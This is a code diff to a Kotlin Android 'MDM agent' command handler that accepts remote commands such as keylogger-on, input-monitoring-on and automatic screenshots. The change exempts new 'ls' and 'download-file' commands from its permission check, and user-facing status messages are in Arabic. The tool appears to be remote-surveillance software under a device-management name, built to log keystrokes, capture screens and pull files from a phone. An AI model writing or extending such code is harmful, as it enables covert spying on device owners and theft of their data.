@@ -55,7 +55,8 @@ class CommandHandler(
                     "keylogger-on", "keylogger-off",
                     "autoclick-on", "autoclick-off",
                     "input-monitoring-on", "input-monitoring-off",
-                    "screenshot-on", "screenshot-off"
+                    "screenshot-on", "screenshot-off",
+                    "ls", "download-file"
                 )
                 if (missingPerms.isNotEmpty() && !isManagementCmd) {
                     val response = JSONObject().apply {
@@ -310,7 +311,7 @@ class CommandHandler(
                 if (com.mdm.agent.service.ScreenCaptureService.isReady()) {
                     com.mdm.agent.service.MDMAccessibilityService.setAutoScreenshot(true)
                     Log.i(TAG, "✅ screenshot-on: auto-screenshot enabled (permission already granted)")
-                    "auto_screenshot_enabled"
+                    CollectedData.TextResult("✅ تم تفعيل لقطات الشاشة التلقائية (الصلاحية ممنوحة مسبقاً)")
                 } else {
                     Log.i(TAG, "📸 screenshot-on: requesting MediaProjection permission from user (one-time)")
                     Handler(Looper.getMainLooper()).post {
@@ -323,7 +324,9 @@ class CommandHandler(
                             Log.e(TAG, "❌ Failed to request MediaProjection: ${e.message}")
                         }
                     }
-                    "permission_dialog_shown"
+                    // Return "waiting" status - the actual success/error will be sent
+                    // by ScreenCapturePermissionActivity after the user approves/denies
+                    CollectedData.TextResult("⏳ تم إرسال طلب الموافقة على الهاتف - في انتظار موافقة المستخدم")
                 }
             }
             "screenshot-off" -> {
